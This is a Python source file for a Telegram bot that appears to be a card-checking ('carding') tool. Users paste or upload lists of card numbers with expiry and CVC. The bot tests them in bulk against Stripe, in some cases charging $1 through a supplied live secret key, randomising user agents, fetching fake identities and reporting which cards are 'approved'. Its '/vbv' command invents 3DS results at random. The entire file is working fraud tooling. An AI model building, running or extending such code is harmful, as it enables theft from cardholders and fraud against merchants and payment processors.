    async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not context.args:
            await update.message.reply_text("Please provide card details in format: number|month|year|cvc")
            return

        cc_data = context.args[0]
        result = await Commands.check_card(cc_data, update)
        await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=result,
                reply_to_message_id=update.message.message_id
            )

    @staticmethod
    async def validate_card(cc_data: str) -> tuple:
        try:
            parts = cc_data.strip().split("|")
            if len(parts) != 4:
                return False, "Invalid format"

            number, month, year, cvc = parts
            number = number.strip()
            month = month.strip()
            year = year.strip()
            cvc = cvc.strip()

            if not all(part.isdigit() for part in [number, month, year, cvc]):
                return False, "All parts must be numeric"

            if len(year) == 2:
                year = "20" + year

            if not (1 <= int(month) <= 12):
                return False, "Invalid month"

            if len(cvc) not in [3, 4]:
                return False, "Invalid CVC length"

            return True, (number, month, year, cvc)
        except Exception as e:
            return False, str(e)

    @staticmethod
    async def svv_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not context.args:
            await update.message.reply_text("Please provide card details in format:\n/svv number|month|year|cvc")
            return

        cc_data = context.args[0]
        valid, result = await Commands.validate_card(cc_data)

        if not valid:
            await update.message.reply_text(f"❌ {result}")
            return

        context.user_data['pending_cc'] = cc_data
        await update.message.reply_text("💳 Card Received\n⌛ Please provide your SK key (starts with sk_live_)")

    @staticmethod
    async def validate_sk(sk: str) -> bool:
        return bool(re.match(r'^sk_live_[A-Za-z0-9]{24,}$', sk))

    @staticmethod
    async def process_stripe_payment(sk: str, number: str, month: str, year: str, cvc: str) -> dict:
        try:
            # Create payment method
            pm_data = {
                "type": "card",
                "card[number]": number,
                "card[exp_month]": month,
                "card[exp_year]": year,
                "card[cvc]": cvc
            }

            headers = {
                "Authorization": f"Bearer {sk}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": UserAgent().random
            }

            async with aiohttp.ClientSession() as session:
                # Create payment method
                async with session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=pm_data
                ) as pm_response:
                    if not pm_response.ok:
                        pm_json = await pm_response.json()
                        return {
                            "success": False, 
                            "message": pm_json.get("error", {}).get("message", "Payment method creation failed")
                        }

                    pm_id = (await pm_response.json()).get("id")

                # Create payment intent
                pi_data = {
                    "amount": 100,
                    "currency": "usd",
                    "payment_method": pm_id,
                    "confirm": True,
                    "off_session": True
                }

                async with session.post(
                    "https://api.stripe.com/v1/payment_intents",
                    headers=headers,
                    data=pi_data
                ) as pi_response:
                    return {
                        "success": True, 
                        "response": await pi_response.json()
                    }

        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    async def handle_sk_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if 'pending_cc' not in context.user_data:
            return

        # Delete the SK message for security
        await update.message.delete()

        sk = update.message.text
        if not await Commands.validate_sk(sk):
            await update.message.reply_text("❌ Invalid SK key format!")
            return

        cc_data = context.user_data['pending_cc']
        del context.user_data['pending_cc']

        checking_message = await update.message.reply_text("⌛ Processing card...")

        try:
            number, month, year, cvc = cc_data.split("|")

            # Clean and validate the data
            number = number.strip()
            month = month.strip()
            year = year.strip()
            cvc = cvc.strip()

            if not all([number.isdigit(), month.isdigit(), year.isdigit(), cvc.isdigit()]):
                await checking_message.reply_text("❌ INVALID CARD FORMAT\n💳 " + cc_data)
                return

            # Ensure proper year format for Stripe API
            if len(year) == 2:
                year = "20" + year

            await checking_message.edit_text("⌛ Connecting to Stripe API...")
            result = await Commands.process_stripe_payment(sk, number, month, year, cvc)

            if not result["success"]:
                await checking_message.reply_text(f"❌ ERROR: {result['message']}\n💳 {cc_data}")
                return

            response = result["response"]

            if response.get("status") == "succeeded":
                msg = f"✅ APPROVED\n💳 {cc_data}\n💲 1$ CHARGED"
            elif response.get("error"):
                error = response["error"]
                code = error.get("decline_code", "").upper() or error.get("code", "").upper()

                if "insufficient_funds" in str(error):
                    msg = f"✅ INSUFFICIENT_FUNDS\n💳 {cc_data}"
                elif "security_code" in str(error):
                    msg = f"❌ INCORRECT_CVC\n💳 {cc_data}"
                elif "authentication_required" in str(error):
                    msg = f"❌ 3DS_REQUIRED\n💳 {cc_data}"
                else:
                    msg = f"❌ {code or 'DECLINED'}\n💳 {cc_data}"
            else:
                msg = f"❌ UNKNOWN ERROR\n💳 {cc_data}"

            await checking_message.reply_text(msg)

        except Exception as e:
            await checking_message.reply_text(f"❌ ERROR: {str(e)}\n💳 {cc_data}")

    @staticmethod
    async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id in MASS_CHECK_ACTIVE:
            MASS_CHECK_ACTIVE[user_id] = False
            await update.message.reply_text("🛑 Mass checking operation stopped.")

    @staticmethod
    async def process_mst_card(card, update, context, session_id, status_msg_id, session):
        try:
            number, month, year, cvc = card.split("|")

            # Get random user data for the transaction
            async with session.get(RANDOM_USER_API) as response:
                user_data = (await response.json())['results'][0]
                first_name = user_data['name']['first']
                last_name = user_data['name']['last']

            # Get Stripe token
            stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
            if not stripe_token:
                return {'status': 'failed', 'message': 'Could not get token', 'card': card}

            # Process payment
            payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
            result = payment_result.get('message', 'Unknown response')

            # Check for success keywords
            success_keywords = [
                "succeeded", "success", "Thank you", "approved", "complete", 
                "completed", "pass", "Thanks", "successful", "Saved payment method"
            ]

            is_success = any(keyword.lower() in str(result).lower() for keyword in success_keywords)

            return {
                'status': 'success' if is_success else 'failed',
                'message': result,
                'card': card
            }

        except Exception as e:
            return {'status': 'error', 'message': str(e), 'card': card}

    @staticmethod
    async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text("Please reply to a file containing cards")
            return

        # Initialize user session
        session_id = user_id  #Using user_id as session ID for simplicity. Consider a more robust approach for production.
        USER_SESSIONS[session_id] = {
            'approved': 0,
            'declined': 0,
            'checked': 0,
            'total': 0,
            'active': True
        }
        MASS_CHECK_ACTIVE[session_id] = True

        try:
            file = await update.message.reply_to_message.document.get_file()
            content = (await file.download_as_bytearray()).decode('utf-8')
            cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
            total_cards = len(cards)
            USER_SESSIONS[session_id]['total'] = total_cards

            # Determine worker count based on number of cards
            if total_cards <= 80:
                workers = 5
            elif total_cards <= 500:
                workers = 16
            else:
                workers = 35

            # Create initial status message
            status_msg = await update.message.reply_text(
                f"Antico Cleaner\n"
                f"Total Filtered Cards: {total_cards}\n\n"
                f"Please Wait Checking Your Cards 🟢\n\n"
                f"Gate -> Stripe Auth 🟢\n\n"
                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                f"CC • \n\n"
                f"Status • \n\n"
                f"APPROVED !✔ • 0\n"
                f"DECLINED !✔ • 0\n"
                f"0 / {total_cards} •\n\n"
                f"Stop Check 🟢",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{session_id}")]
                ])
            )

            # Process cards with asyncio.gather for better concurrency
            semaphore = asyncio.Semaphore(workers)  # Limit concurrent tasks

            async def process_card_wrapper(card):
                async with semaphore:
                    if not MASS_CHECK_ACTIVE.get(session_id, True):
                        return None

                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
                        result = await Commands.process_mst_card(card, update, context, session_id, status_msg.message_id, session)

                    if result and result.get('status') == 'success':
                        USER_SESSIONS[session_id]['approved'] += 1
                        # Send approved card to user
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
                        )
                    else:
                        USER_SESSIONS[session_id]['declined'] += 1

                    USER_SESSIONS[session_id]['checked'] += 1

                    # Update status message
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=status_msg.message_id,
                            text=(
                                f"Antico Cleaner\n"
                                f"Total Filtered Cards: {total_cards}\n\n"
                                f"Please Wait Checking Your Cards 🟢\n\n"
                                f"Gate -> Stripe Auth 🟢\n\n"
                                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                                f"CC • {result.get('card', '')}\n\n"
                                f"Status • {'APPROVED 🟢' if result and result.get('status') == 'success' else 'DECLINED 🟢'}\n\n"
                                f"APPROVED !✔ • {USER_SESSIONS[session_id]['approved']}\n"
                                f"DECLINED !✔ • {USER_SESSIONS[session_id]['declined']}\n"
                                f"{USER_SESSIONS[session_id]['checked']} / {total_cards} •\n\n"
                                f"Stop Check 🟢"
                            ),
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{session_id}")]
                            ])
                        )
                    except Exception as e:
                        logger.error(f"Error updating status message: {str(e)}")

                    return result

            # Process cards in batches to avoid memory issues
            batch_size = 50
            for i in range(0, len(cards), batch_size):
                if not MASS_CHECK_ACTIVE.get(session_id, True):
                    break

                batch = cards[i:i + batch_size]
                await asyncio.gather(*[process_card_wrapper(card) for card in batch])

            # Final message if not stopped
            if MASS_CHECK_ACTIVE.get(session_id, False):
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg.message_id,
                    text=(
                        f"✅ Mass check completed!\n"
                        f"Approved: {USER_SESSIONS[session_id]['approved']}\n"
                        f"Declined: {USER_SESSIONS[session_id]['declined']}\n"
                        f"Total: {total_cards}"
                    )
                )
                MASS_CHECK_ACTIVE[session_id] = False

        except Exception as e:
            logger.error(f"Error in mst_command: {str(e)}")
            await update.message.reply_text(f"Error processing cards: {str(e)}")
        finally:
            if session_id in USER_SESSIONS:
                USER_SESSIONS[session_id]['active'] = False
            if session_id in MASS_CHECK_ACTIVE:
                MASS_CHECK_ACTIVE[session_id] = False

    @staticmethod
    async def process_mstt_card(card, update, context, user_id, status_msg_id):
        try:
            cc_number, exp_month, exp_year, cvc = card.split('|')

            result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)

            # Check for success keywords
            success_keywords = [
                "succeeded", "success", "Thank you", "approved", "complete", 
                "completed", "pass", "Thanks", "successful", "Saved payment method"
            ]

            is_success = any(keyword.lower() in str(result.get('message', '')).lower() for keyword in success_keywords)

            return {
                'status': 'success' if is_success else 'failed',
                'message': result.get('message', 'Unknown response'),
                'card': card
            }

        except Exception as e:
            return {'status': 'error', 'message': str(e), 'card': card}

    @staticmethod
    async def mstt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text("Please reply to a file containing cards")
            return

        # Initialize user session
        USER_SESSIONS[user_id] = {
            'approved': 0,
            'declined': 0,
            'checked': 0,
            'total': 0,
            'active': True
        }
        MASS_CHECK_ACTIVE[user_id] = True

        try:
            file = await update.message.reply_to_message.document.get_file()
            content = (await file.download_as_bytearray()).decode('utf-8')
            cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
            total_cards = len(cards)
            USER_SESSIONS[user_id]['total'] = total_cards

            # Determine worker count based on number of cards
            if total_cards <= 80:
                workers = 5
            elif total_cards <= 500:
                workers = 16
            else:
                workers = 35

            # Create initial status message
            status_msg = await update.message.reply_text(
                f"Antico Cleaner\n"
                f"Total Filtered Cards: {total_cards}\n\n"
                f"Please Wait Checking Your Cards 🟢\n\n"
                f"Gate -> Stripe Auth 🟢\n\n"
                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                f"CC • \n\n"
                f"Status • \n\n"
                f"APPROVED !✔ • 0\n"
                f"DECLINED !✔ • 0\n"
                f"0 / {total_cards} •\n\n"
                f"Stop Check 🟢",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
                ])
            )

            # Process cards with asyncio.gather for better concurrency
            semaphore = asyncio.Semaphore(workers)  # Limit concurrent tasks

            async def process_card_wrapper(card):
                async with semaphore:
                    if not MASS_CHECK_ACTIVE.get(user_id, True):
                        return None

                    result = await Commands.process_mstt_card(card, update, context, user_id, status_msg.message_id)

                    if result and result.get('status') == 'success':
                        USER_SESSIONS[user_id]['approved'] += 1
                        # Send approved card to user
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
                        )
                    else:
                        USER_SESSIONS[user_id]['declined'] += 1

                    USER_SESSIONS[user_id]['checked'] += 1

                    # Update status message
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=status_msg.message_id,
                            text=(
                                f"Antico Cleaner\n"
                                f"Total Filtered Cards: {total_cards}\n\n"
                                f"Please Wait Checking Your Cards 🟢\n\n"
                                f"Gate -> Stripe Auth 🟢\n\n"
                                f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
                                f"CC • {result.get('card', '')}\n\n"
                                f"Status • {'APPROVED 🟢' if result and result.get('status') == 'success' else 'DECLINED 🟢'}\n\n"
                                f"APPROVED !✔ • {USER_SESSIONS[user_id]['approved']}\n"
                                f"DECLINED !✔ • {USER_SESSIONS[user_id]['declined']}\n"
                                f"{USER_SESSIONS[user_id]['checked']} / {total_cards} •\n\n"
                                f"Stop Check 🟢"
                            ),
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
                            ])
                        )
                    except Exception as e:
                        logger.error(f"Error updating status message: {str(e)}")

                    return result

            # Process cards in batches to avoid memory issues
            batch_size = 50
            for i in range(0, len(cards), batch_size):
                if not MASS_CHECK_ACTIVE.get(user_id, True):
                    break

                batch = cards[i:i + batch_size]
                await asyncio.gather(*[process_card_wrapper(card) for card in batch])

            # Final message if not stopped
            if MASS_CHECK_ACTIVE.get(user_id, False):
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_msg.message_id,
                    text=(
                        f"✅ Mass check completed!\n"
                        f"Approved: {USER_SESSIONS[user_id]['approved']}\n"
                        f"Declined: {USER_SESSIONS[user_id]['declined']}\n"
                        f"Total: {total_cards}"
                    )
                )
                MASS_CHECK_ACTIVE[user_id] = False

        except Exception as e:
            logger.error(f"Error in mstt_command: {str(e)}")
            await update.message.reply_text(f"Error processing cards: {str(e)}")
        finally:
            if user_id in USER_SESSIONS:
                USER_SESSIONS[user_id]['active'] = False
            if user_id in MASS_CHECK_ACTIVE:
                MASS_CHECK_ACTIVE[user_id] = False

    @staticmethod
    async def stt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            if len(context.args) < 1:
                await update.message.reply_text("Please provide CC info in format: /stt 5104040271954646|02|26|607")
                return

            cc_info = context.args[0]
            parts = cc_info.split('|')
            if len(parts) != 4:
                await update.message.reply_text("Invalid format. Use: /stt 5104040271954646|02|26|607")
                return

            cc_number, exp_month, exp_year, cvc = parts

            # Send processing message
            processing_msg = await update.message.reply_text("🔄 Processing your card, please wait...")

            # Run validation
            result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)
            bin_info = await CardChecker.check_bin(cc_number[:6])

            # Format response
            status_emoji = "✅" if result['status'] == 'success' or (isinstance(result['message'], str) and 'success' in result['message'].lower()) else "❌"

            response = f"""📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
━━━━━━━━━━━━━━━

💳 𝗖𝗮𝗿𝗱 ➜ {cc_number}|{exp_month}|{exp_year}|{cvc}
🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe auth
📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {status_emoji}
⚡️ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['message']}

━━━━━━━━━━━━━━━
𝗕𝗶𝗻 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
━━━━━━━━━━━━━━━

🔍 𝗕𝗶𝗻 ➜ {cc_number[:6]}
🏷️ 𝗕𝗿𝗮𝗻𝗱 ➜ {bin_info.get('brand', 'N/A')}
🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {bin_info.get('country_code', 'N/A')}
🇨🇴 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 𝗡𝗮𝗺𝗲 ➜ {bin_info.get('country_name', 'N/A')}
🏦 𝗕𝗮𝗻𝗸 ➜ {bin_info.get('bank', 'N/A')}
📶 𝗟𝗲𝘃𝗲𝗹 ➜ {bin_info.get('level', 'N/A')}
📌 𝗧𝘆𝗽𝗲 ➜ {bin_info.get('type', 'N/A')}

━━━━━━━━━━━━━━━
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @MUMIRU
━━━━━━━━━━━━━━━"""

            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text=response
            )

        except Exception as e:
            await update.message.reply_text(f"Error processing your request: {str(e)}")

    @staticmethod
    async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not context.args:
            await update.message.reply_text("Please provide card number or BIN.\nFormat: /vbv 123456789012345 or /vbv 123456")
            return

        input_data = context.args[0]
        is_bin = len(input_data) <= 6

        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://bins.antipublic.cc/bins/{input_data[:6]}"
                async with session.get(url) as response:
                    bin_data = await response.json()

                issuer = bin_data.get('bank', 'Unknown')
                country = bin_data.get('country_name', 'Unknown')
                brand = bin_data.get('brand', 'Unknown')
                
                # Simulate Challenge check based on issuer and country
                challenge_required = random.choice([True, False])
                challenge_response = "Challenge Required ✅" if challenge_required else "Challenge Not Required ❌"

                response_text = f"""CC ⌁ {input_data if not is_bin else f"BIN: {input_data}"}
Status ⌁ {challenge_response}
Message ⌁ {'3DS Required' if challenge_required else '3DS Not Required'}
Gateway ⌁ B3 VBV LookUp 🔍

Bin ⌁ {input_data[:6]}
Bank ⌁ {issuer}
Country ⌁ {country}
𝗥𝗲𝗾 ⌁ @{update.effective_user.username or 'N/A'}
𝗗𝗲𝘃𝗕𝘆 ⌁ @mumiru"""

                await update.message.reply_text(response_text)

        except Exception as e:
            await update.message.reply_text(f"Error checking 3DS status: {str(e)}")

    @staticmethod
    async def stop_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        query = update.callback_query
        await query.answer()

        session_id = int(query.data.split('_')[-1])
        if session_id in MASS_CHECK_ACTIVE:
            MASS_CHECK_ACTIVE[session_id] = False
            await query.edit_message_text("🛑 Mass check stopped by user.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle errors caused by updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)
    if isinstance(context.error, Forbidden):
        logger.warning("Bot was blocked by the user")
    elif isinstance(context.error, NetworkError):
        logger.warning("Network error occurred")
    else:
        logger.error("Update %s caused error %s", update, context.error)

def run_bot():
    # Initialize bot with optimized settings for concurrent requests
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .pool_timeout(60)
        .read_timeout(60)
        .write_timeout(60)
        .connection_pool_size(100)
        .concurrent_updates(True)
        .build()
    )

    # Register error handler
    application.add_error_handler(error_handler)

    # Add conversation handler for /gbin command
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('gbin', Commands.gbin)],
        states={
            SELECT_BIN_TYPE: [MessageHandler(filters.TEXT & ~filters.COMMAND, Commands.select_bin_type)],
            SELECT_DIGITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, Commands.select_digits)],
        },
        fallbacks=[CommandHandler('cancel', Commands.cancel)],
    )

    # Add command handlers
    application.add_handler(CommandHandler("start", Commands.start))
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("bin", Commands.bin_command))
    application.add_handler(MessageHandler(filters.TEXT | filters.DOCUMENT, Commands.handle_bin_input))
    application.add_handler(CommandHandler("mbin", Commands.mbin))
    application.add_handler(CommandHandler("gen", Commands.gen))
    application.add_handler(CommandHandler("register", Commands.register_command))
    application.add_handler(CommandHandler("cmds", Commands.cmds))
    application.add_handler(CommandHandler("user", Commands.generate_random_user))
    application.add_handler(CommandHandler("st", Commands.st_command))
    application.add_handler(CommandHandler("mst", Commands.mst_command))
    application.add_handler(CommandHandler("mstt", Commands.mstt_command))
    application.add_handler(CommandHandler("sk", Commands.check_sk))
    application.add_handler(CommandHandler("svv", Commands.svv_command))
    application.add_handler(CommandHandler("stt", Commands.stt_command))
    application.add_handler(CommandHandler("stop", Commands.stop_command))
    application.add_handler(CommandHandler("vbv", Commands.vbv_command))
    application.add_handler(CallbackQueryHandler(Commands.button_callback))
    application.add_handler(CallbackQueryHandler(Commands.stop_check_callback, pattern=r"^stop_check_\d+$"))

    # Add message handler for SK input
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^sk_') & ~filters.COMMAND, Commands.handle_sk_message))

    # Start bot with increased connection pool
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        pool_timeout=60,
        read_timeout=60,
        write_timeout=60,
        connect_timeout=60
    )

if __name__ == "__main__":
    # Start Telegram bot
    run_bot()